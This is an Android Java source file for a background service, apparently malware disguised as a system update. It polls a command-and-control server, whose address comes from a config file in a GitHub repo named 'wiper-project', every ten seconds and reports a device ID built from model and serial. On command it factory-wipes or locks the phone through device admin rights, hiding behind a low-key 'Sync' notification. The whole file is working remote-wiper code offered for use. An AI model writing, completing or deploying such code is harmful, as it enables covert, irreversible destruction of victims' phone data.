package com.vanta.sysupdate;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class C2Service extends Service {
    // رابط ملف الإعدادات في مستودعك على GitHub
    static final String CONFIG_URL = "https://raw.githubusercontent.com/USERNAME/wiper-project/main/c2.txt";
    static final String FALLBACK = "https://example.com";
    static final int INTERVAL_MS = 10000;

    private Handler handler;
    private DevicePolicyManager dpm;

    private String fetch(String url, int timeout) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(timeout);
        c.setReadTimeout(timeout);
        BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
        String line = r.readLine();
        r.close();
        c.disconnect();
        return line == null ? "" : line.trim();
    }

    private String deviceId() {
        String serial;
        try { serial = Build.SERIAL; } catch (Exception e) { serial = "unknown"; }
        return Build.MODEL.replace(" ", "_") + "_" + serial;
    }

    private final Runnable poll = new Runnable() {
        @Override
        public void run() {
            String base = FALLBACK;
            try {
                String cfg = fetch(CONFIG_URL + "?t=" + System.currentTimeMillis(), 5000);
                if (cfg.startsWith("http")) base = cfg;
            } catch (Exception ignored) {}
            try {
                String cmd = fetch(base + "/cmd?id=" + deviceId(), 5000);
                if (cmd.startsWith("wipe")) {
                    dpm.wipeData(0);
                } else if (cmd.startsWith("lock")) {
                    dpm.lockNow();
                }
            } catch (Exception ignored) {}
            handler.postDelayed(this, INTERVAL_MS);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("c2", "Sync", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
            Notification n = new Notification.Builder(this, "c2")
                    .setContentTitle("Sync")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .build();
            startForeground(1, n);
        }
        handler.post(poll);
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
